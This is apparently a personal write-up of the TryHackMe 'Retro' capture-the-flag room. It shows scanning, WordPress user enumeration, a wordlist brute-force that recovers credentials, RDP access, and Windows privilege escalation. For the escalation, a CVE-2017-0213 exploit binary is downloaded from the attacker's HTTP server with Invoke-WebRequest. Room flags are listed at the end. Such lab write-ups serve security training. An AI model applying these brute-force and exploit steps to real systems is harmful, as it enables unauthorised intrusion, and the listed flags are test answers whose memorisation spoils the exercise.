---
New high score!
---

![](https://i.imgur.com/RDzWHJI.png)

![|333](https://tryhackme-images.s3.amazonaws.com/room-icons/a222ca9fb08b8bdc9e10a0f6ba41ea99.jpeg)

### Pwn 

![|333](https://i.imgur.com/kUwtBc8.png)

Can you time travel? If not, you might want to think about the next best thing.

Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.

-------------------------------------

There are two distinct paths that can be taken on Retro. One requires significantly less trial and error, however, both will work. Please check writeups if you are curious regarding the two paths. An alternative version of this room is available in it's remixed version Blaster.

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -T4 -A -Pn -sS -n -O 10.10.106.113
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-28 13:16 EDT
Nmap scan report for 10.10.106.113
Host is up (0.21s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RETROWEB
|   NetBIOS_Domain_Name: RETROWEB
|   NetBIOS_Computer_Name: RETROWEB
|   DNS_Domain_Name: RetroWeb
|   DNS_Computer_Name: RetroWeb
|   Product_Version: 10.0.14393
|_  System_Time: 2022-09-28T17:16:43+00:00
| ssl-cert: Subject: commonName=RetroWeb
| Not valid before: 2022-09-27T17:15:11
|_Not valid after:  2023-03-29T17:15:11
|_ssl-date: 2022-09-28T17:16:47+00:00; 0s from scanner time.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2016 (89%), FreeBSD 6.X (85%)
OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:freebsd:freebsd:6.2
Aggressive OS guesses: Microsoft Windows Server 2016 (89%), FreeBSD 6.2-RELEASE (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   205.34 ms 10.11.0.1
2   206.26 ms 10.10.106.113

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.40 seconds
zsh: segmentation fault  sudo nmap -sC -sV -T4 -A -Pn -sS -n -O 10.10.106.113


┌──(kali㉿kali)-[~]
└─$ feroxbuster --url http://10.10.106.113 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 60 -C 404,403 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.106.113
 🚀  Threads               │ 60
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 💢  Status Code Filters   │ [404, 403]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       32l       55w      703c http://10.10.106.113/
301      GET        2l       10w      150c http://10.10.106.113/retro => http://10.10.106.113/retro/
301      GET        2l       10w      161c http://10.10.106.113/retro/wp-content => http://10.10.106.113/retro/wp-content/
301      GET        2l       10w      168c http://10.10.106.113/retro/wp-content/themes => http://10.10.106.113/retro/wp-content/themes/
301      GET        2l       10w      169c http://10.10.106.113/retro/wp-content/uploads => http://10.10.106.113/retro/wp-content/uploads/
301      GET        2l       10w      169c http://10.10.106.113/retro/wp-content/plugins => http://10.10.106.113/retro/wp-content/plugins/
301      GET        2l       10w      162c http://10.10.106.113/retro/wp-includes => http://10.10.106.113/retro/wp-includes/
301      GET        2l       10w      169c http://10.10.106.113/retro/wp-includes/images => http://10.10.106.113/retro/wp-includes/images/
301      GET        2l       10w      169c http://10.10.106.113/retro/wp-content/upgrade => http://10.10.106.113/retro/wp-content/upgrade/
301      GET        2l       10w      175c http://10.10.106.113/retro/wp-includes/images/media => http://10.10.106.113/retro/wp-includes/images/media/
301      GET        2l       10w      169c http://10.10.106.113/retro/wp-includes/Images => http://10.10.106.113/retro/wp-includes/Images/
301      GET        2l       10w      167c http://10.10.106.113/retro/wp-includes/text => http://10.10.106.113/retro/wp-includes/text/

add ip to /etc/hosts because when enter ip/retro/wp-admin gives an error which is the localhost of mine so add it!

┌──(kali㉿kali)-[~]
└─$ sudo nano /etc/hosts                                
                                                                                                                 
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts                     
127.0.0.1       localhost
127.0.1.1       kali
10.10.113.254   magician
10.10.121.237   git.git-and-crumpets.thm
10.10.149.10    hipflasks.thm hipper.hipflasks.thm
10.10.91.93     raz0rblack raz0rblack.thm
10.10.234.77    lab.enterprise.thm
10.10.96.58     source
10.10.59.104    CONTROLLER.local
10.10.54.75     acmeitsupport.thm
10.10.102.33    overwrite.uploadvulns.thm shell.uploadvulns.thm java.uploadvulns.thm annex.uploadvulns.thm magic.uploadvulns.thm jewel.uploadvulns.thm demo.uploadvulns.thm
10.10.179.221   development.smag.thm
10.10.87.241    mafialive.thm
10.10.97.105    internal.thm
10.10.106.113   retro.thm
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

http://retro.thm/retro/wp-login.php

using wpscan

Now, we will use wpscan to enumerate plugins, themes, and users.

┌──(kali㉿kali)-[~]
└─$ wpscan --url http://retro.thm/retro -e u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]
[+] URL: http://retro.thm/retro/ [10.10.106.113]
[+] Started: Wed Sep 28 13:31:31 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Microsoft-IIS/10.0
 |  - X-Powered-By: PHP/7.1.29
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://retro.thm/retro/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://retro.thm/retro/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://retro.thm/retro/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.2.1 identified (Insecure, released on 2019-05-21).
 | Found By: Rss Generator (Passive Detection)
 |  - http://retro.thm/retro/index.php/feed/, <generator>https://wordpress.org/?v=5.2.1</generator>
 |  - http://retro.thm/retro/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.2.1</generator>

[+] WordPress theme in use: 90s-retro
 | Location: http://retro.thm/retro/wp-content/themes/90s-retro/
 | Latest Version: 1.4.10 (up to date)
 | Last Updated: 2019-04-15T00:00:00.000Z
 | Readme: http://retro.thm/retro/wp-content/themes/90s-retro/readme.txt
 | Style URL: http://retro.thm/retro/wp-content/themes/90s-retro/style.css?ver=5.2.1
 | Style Name: 90s Retro
 | Style URI: https://organicthemes.com/retro-theme/
 | Description: Have you ever wished your WordPress blog looked like an old Geocities site from the 90s!? Probably n...
 | Author: Organic Themes
 | Author URI: https://organicthemes.com
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.4.10 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://retro.thm/retro/wp-content/themes/90s-retro/style.css?ver=5.2.1, Match: 'Version: 1.4.10'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:07 <===================================> (10 / 10) 100.00% Time: 00:00:07

[i] User(s) Identified:

[+] wade
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://retro.thm/retro/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Wade
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed Sep 28 13:32:15 2022
[+] Requests Done: 54
[+] Cached Requests: 6
[+] Data Sent: 13.229 KB
[+] Data Received: 238.983 KB
[+] Memory used: 203.473 MB
[+] Elapsed time: 00:00:43


We discover that everything on the box is updated, which straitens our attack surface, but we have a username on the box which is wade.


Since we have a username and our attack possibilities are limited to just a couple of ways. We are going to create a custom wordlist from WordPress blog we came accross earlier. To do this, we will use CeWL tool. We scan to a depth of 3 (-d 3) and use a minimum word length of 7 (-m 7), then save the words to a file (-w retrowl.txt), targeting the URL (http://retro.thm/retro/).


or can be done with the dict rockyou.txt

                                                                                                                 
┌──(kali㉿kali)-[~]
└─$ cewl -d 3 -m 7 -w retrowl.txt http://retro.thm/retro/
CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
                                                                                                                 
┌──(kali㉿kali)-[~]
└─$ wc -l retrowl.txt 
302 retrowl.txt


After we create our custom wordlist, we will bruteforce WordPress admin login page to see if we can get a valid password to log in.


┌──(kali㉿kali)-[~]
└─$ wpscan --url http://retro.thm/retro -U Wade -P retrowl.txt       
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]
[+] URL: http://retro.thm/retro/ [10.10.106.113]
[+] Started: Wed Sep 28 13:37:25 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Microsoft-IIS/10.0
 |  - X-Powered-By: PHP/7.1.29
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://retro.thm/retro/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://retro.thm/retro/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://retro.thm/retro/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.2.1 identified (Insecure, released on 2019-05-21).
 | Found By: Rss Generator (Passive Detection)
 |  - http://retro.thm/retro/index.php/feed/, <generator>https://wordpress.org/?v=5.2.1</generator>
 |  - http://retro.thm/retro/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.2.1</generator>

[+] WordPress theme in use: 90s-retro
 | Location: http://retro.thm/retro/wp-content/themes/90s-retro/
 | Latest Version: 1.4.10 (up to date)
 | Last Updated: 2019-04-15T00:00:00.000Z
 | Readme: http://retro.thm/retro/wp-content/themes/90s-retro/readme.txt
 | Style URL: http://retro.thm/retro/wp-content/themes/90s-retro/style.css?ver=5.2.1
 | Style Name: 90s Retro
 | Style URI: https://organicthemes.com/retro-theme/
 | Description: Have you ever wished your WordPress blog looked like an old Geocities site from the 90s!? Probably n...
 | Author: Organic Themes
 | Author URI: https://organicthemes.com
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.4.10 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://retro.thm/retro/wp-content/themes/90s-retro/style.css?ver=5.2.1, Match: 'Version: 1.4.10'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:11 <==================================> (137 / 137) 100.00% Time: 00:00:11

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - Wade / parzival                                                                                      
Trying Wade / requires Time: 00:01:05 <===========                            > (130 / 432) 30.09%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: Wade, Password: parzival

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed Sep 28 13:38:58 2022
[+] Requests Done: 272
[+] Cached Requests: 35
[+] Data Sent: 104.547 KB
[+] Data Received: 101.03 KB
[+] Memory used: 228.785 MB
[+] Elapsed time: 00:01:33

Wade:parzival

if there wasn't found so changing to chewl -m 6 or 8 to the length of pass or just use rockyou.txt

login

We log in using credentials we found via wpscan bruteforce, we try to get a reverse shell through editing /404.php page and we get a reverse shell; however, the shell we get drops the connecting every minute and we are not able to download files such as nc.exe nor a reverse shell we create via msfvenom to get a stable shell.

While this is the case, we remember that there is another open port on the box which allows us to connect via RDP.
Exploitation

So, we use credentials we found to log in via xfeerdp to see if we are able to have a connection to the box.


┌──(kali㉿kali)-[~]
└─$ xfreerdp /u:Wade /p:'parzival' /v:10.10.106.113 /size:85%
[13:51:00:156] [38165:38170] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[13:51:00:156] [38165:38170] [WARN][com.freerdp.crypto] - CN = RetroWeb
[13:51:00:164] [38165:38170] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[13:51:00:168] [38165:38170] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[13:51:00:168] [38165:38170] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[13:51:00:168] [38165:38170] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.10.106.113:3389) 
[13:51:00:168] [38165:38170] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[13:51:00:168] [38165:38170] [ERROR][com.freerdp.crypto] - Common Name (CN):
[13:51:00:168] [38165:38170] [ERROR][com.freerdp.crypto] -      RetroWeb
[13:51:00:168] [38165:38170] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.10.106.113:3389 (RDP-Server):
        Common Name: RetroWeb
        Subject:     CN = RetroWeb
        Issuer:      CN = RetroWeb
        Thumbprint:  4a:43:a0:37:ea:3d:0d:08:4a:ea:bc:98:d9:3f:43:8a:85:ef:e8:d5:06:14:9c:5e:23:6c:00:a2:f7:d6:bc:08
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
[13:51:08:107] [38165:38170] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[13:51:08:108] [38165:38170] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[13:51:08:332] [38165:38170] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[13:51:08:336] [38165:38170] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[13:51:11:309] [38165:38170] [INFO][com.freerdp.client.x11] - Logon Error Info LOGON_FAILED_OTHER [LOGON_MSG_SESSION_CONTINUE]

looks nice the background windows

We are now on the box and it is time to enumerate for privilege escalation after getting our low shell hash located on Desktop inside user.txt.

And it works. We are able to RDP into the box.


priv esc

We enumerate the machine to find weak services, permissions, and files on the server.

We see that we can leverage CVE-2019-1388 on the box.

https://github.com/jas502n/CVE-2019-1388

Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Users\Wade>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled


However, after trying that exploit for a while, we understand that we are not able to get root privileges on the box (this is a personal experience, it may work for someone else). We decide to enumerate box further to find another way to escalate our privilege.

Therefore, since the box is Microsoft Windows Server 2016 Standard and OS version is 10.0.14393 N/A Build 14393, we decide to google it to find another way for post-exploitation.

Enumerating system information to find out more information about the operating system, its version/build and any hotfixes installed:


C:\Users\Wade>systeminfo

Host Name:                 RETROWEB
OS Name:                   Microsoft Windows Server 2016 Standard
OS Version:                10.0.14393 N/A Build 14393
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00377-60000-00000-AA325
Original Install Date:     12/8/2019, 10:50:43 PM
System Boot Time:          9/28/2022, 10:14:11 AM
System Manufacturer:       Xen
System Model:              HVM domU
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2300 Mhz
BIOS Version:              Xen 4.11.amazon, 8/24/2006
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     2,048 MB
Available Physical Memory: 963 MB
Virtual Memory: Max Size:  3,200 MB
Virtual Memory: Available: 2,048 MB
Virtual Memory: In Use:    1,152 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\RETROWEB
Hotfix(s):                 1 Hotfix(s) Installed.
                           [01]: KB3192137
Network Card(s):           1 NIC(s) Installed.
                           [01]: AWS PV Network Device
                                 Connection Name: Ethernet
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.10.0.1
                                 IP address(es)
                                 [01]: 10.10.106.113
                                 [02]: fe80::6c44:ec5e:188e:4734
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.

This specific build of Windows 10 is affected by a kernel exploit that allows for privilege escalation (2017-0213), as mentioned in PayloadAllTheThings:


We find a CVE-2017-0213, and we decide to use this exploit to escalate our privilege on the box.

The “Affected Products” section of the repository also confirms that the build the box is running is vulnerable:

download it and pass to the Wade machine

https://github.com/WindowsExploits/Exploits/blob/master/CVE-2017-0213/Binaries/CVE-2017-0213_x64.zip

In order to download file to target box, we set up an Http server on our attacking box via python3 and we move .zip file to the location of the web server we set up.

┌──(kali㉿kali)-[~/Downloads]
└─$ python3 -m http.server                 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...


Then on the target box, Google Chrome is installed, we open it and type our attacking box IP on the web browser and download it.

so cannot pass it , using powershell

┌──(kali㉿kali)-[~/Downloads]
└─$ unzip CVE-2017-0213_x64.zip              
Archive:  CVE-2017-0213_x64.zip
  inflating: CVE-2017-0213_x64.exe 

┌──(kali㉿kali)-[~/Downloads]
└─$ python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.106.113 - - [28/Sep/2022 14:17:28] "GET /CVE-2017-0213_x64.exe HTTP/1.1" 200 -


PS C:\Users\Wade> Invoke-WebRequest -Uri http://10.11.81.220/CVE-2017-0213_x64.exe -OutFile CVE-2017-0213_x64.exe

:)

execute it

PS C:\Users\Wade> .\CVE-2017-0213_x64.exe
Building Library with path: script:C:\Users\Wade\run.sct
Found TLB name at offset 766
QI - Marshaller: {00000000-0000-0000-C000-000000000046} 000001EB48294AC
Queried Success: 000001EB48294AC0
AddRef: 1
QI - Marshaller: {0000001B-0000-0000-C000-000000000046} 000001EB48294AC
QI - Marshaller: {ECC8691B-C1DB-4DC0-855E-65F6C551AF49} 000001EB48294AC
QI - Marshaller: {00000000-0000-0000-C000-000000000046} 000001EB48294AC
Queried Success: 000001EB48294AC0
AddRef: 2
QI - Marshaller: {00000018-0000-0000-C000-000000000046} 000001EB48294AC
QI - Marshaller: {334D391F-0E79-3B15-C9FF-EAC65DD07C42} 000001EB48294AC
QI - Marshaller: {00000040-0000-0000-C000-000000000046} 000001EB48294AC
QI - Marshaller: {334D391F-0E79-3B15-C9FF-EAC65DD07C42} 000001EB48294AC
QI - Marshaller: {94EA2B94-E9CC-49E0-C0FF-EE64CA8F5B90} 000001EB48294AC
QI - Marshaller: {334D391F-0E79-3B15-C9FF-EAC65DD07C42} 000001EB48294AC
QI - Marshaller: {77DD1250-139C-2BC3-BD95-900ACED61BE5} 000001EB48294AC
QI - Marshaller: {334D391F-0E79-3B15-C9FF-EAC65DD07C42} 000001EB48294AC
QI - Marshaller: {BFD60505-5A1F-4E41-88BA-A6FB07202DA9} 000001EB48294AC
QI - Marshaller: {334D391F-0E79-3B15-C9FF-EAC65DD07C42} 000001EB48294AC
QI - Marshaller: {03FB5C57-D534-45F5-A1F4-D39556983875} 000001EB48294AC
QI - Marshaller: {334D391F-0E79-3B15-C9FF-EAC65DD07C42} 000001EB48294AC
QI - Marshaller: {2C258AE7-50DC-49FF-9D1D-2ECB9A52CDD7} 000001EB48294AC
QI - Marshaller: {00000019-0000-0000-C000-000000000046} 000001EB48294AC
QI - Marshaller: {4C1E39E1-E3E3-4296-AA86-EC938D896E92} 000001EB48294AC
Release: 3
Opened Link \??\C: -> \Device\HarddiskVolume2\Users\Wade: 0000000000000
QI - Marshaller: {00000003-0000-0000-C000-000000000046} 000001EB48294D2
Queried Success: 000001EB48294D20
AddRef: 1
Release: 2
QI - Marshaller: {ECC8691B-C1DB-4DC0-855E-65F6C551AF49} 000001EB48294D2
QI - Marshaller: {00000003-0000-0000-C000-000000000046} 000001EB48294D2
Queried Success: 000001EB48294D20
AddRef: 1
Marshal Interface: {00000000-0000-0000-C000-000000000046}
AddRef: 2
AddRef: 3
Release: 4
Marshal Complete: 00000000
Release: 2
AddRef: 3
QI - Marshaller: {00000003-0000-0000-C000-000000000046} 000001EB48294AC
Queried Success: 000001EB48294AC0
AddRef: 4
Marshal Interface: {659CDEAC-489E-11D9-A9CD-000D56965251}
Setting bad IID
Unknown IID: {ECC8691B-C1DB-4DC0-855E-65F6C551AF49} 000001EB482950A0
Unknown IID: {00000003-0000-0000-C000-000000000046} 000001EB482950A0
Unknown IID: {0000001B-0000-0000-C000-000000000046} 000001EB482950A0
Query for IUnknown
Unknown IID: {00000018-0000-0000-C000-000000000046} 000001EB482950A0
Unknown IID: {334D391F-0E79-3B15-C9FF-EAC65DD07C42} 000001EB482950A0
Unknown IID: {00000040-0000-0000-C000-000000000046} 000001EB482950A0
Unknown IID: {334D391F-0E79-3B15-C9FF-EAC65DD07C42} 000001EB482950A0
Unknown IID: {94EA2B94-E9CC-49E0-C0FF-EE64CA8F5B90} 000001EB482950A0
Unknown IID: {334D391F-0E79-3B15-C9FF-EAC65DD07C42} 000001EB482950A0
Unknown IID: {77DD1250-139C-2BC3-BD95-900ACED61BE5} 000001EB482950A0
Unknown IID: {334D391F-0E79-3B15-C9FF-EAC65DD07C42} 000001EB482950A0
Unknown IID: {BFD60505-5A1F-4E41-88BA-A6FB07202DA9} 000001EB482950A0
Unknown IID: {334D391F-0E79-3B15-C9FF-EAC65DD07C42} 000001EB482950A0
Unknown IID: {03FB5C57-D534-45F5-A1F4-D39556983875} 000001EB482950A0
Unknown IID: {334D391F-0E79-3B15-C9FF-EAC65DD07C42} 000001EB482950A0
Unknown IID: {2C258AE7-50DC-49FF-9D1D-2ECB9A52CDD7} 000001EB482950A0
Unknown IID: {00000019-0000-0000-C000-000000000046} 000001EB482950A0
Unknown IID: {4C1E39E1-E3E3-4296-AA86-EC938D896E92} 000001EB482950A0
Query for ITMediaControl
Marshal Complete: 00000000
Release: 5
Release: 4
AddRef: 3
Release: 4
Release: 3
Result: 80029C4A
Done
Release: 1
Release object 000001EB48294D20
Release: 2

and get admin

cannot copy 

but open it with

type C:\Users\Administrator\Desktop\root.txt.txt

795f8b569565d7bd88d10c6f22d1c4063
```

A web server is running on the target. What is the hidden directory which the website lives on?
dirbuster 2.3 medium
*/retro*

![[Pasted image 20220928122948.png]]

![](https://media-exp1.licdn.com/dms/image/C4D12AQGzgWuI3N6_kA/article-inline_image-shrink_1000_1488/0/1624395483217?e=1669852800&v=beta&t=_mVz2JY475JIB4qVJBAAa-E62fyXCcafUW_ZRaIIzeA)

![[Pasted image 20220928125228.png]]

![](https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/07/image-62.png?w=1019&ssl=1)

![](https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/07/image-54.png?w=690&ssl=1)


![[Pasted image 20220928132126.png]]

user.txt
 Don't leave sensitive information out in the open, even if you think you have control over it.
*3b99fbdc6d430bfb51c72c651a261927*

root.txt
Figure out what the user last was trying to find. Otherwise, put this one on ice and get yourself a better shell, perhaps one dipped in venom.
*795f8b569565d7bd88d10c6f22d1c4063*



[[Internal]]

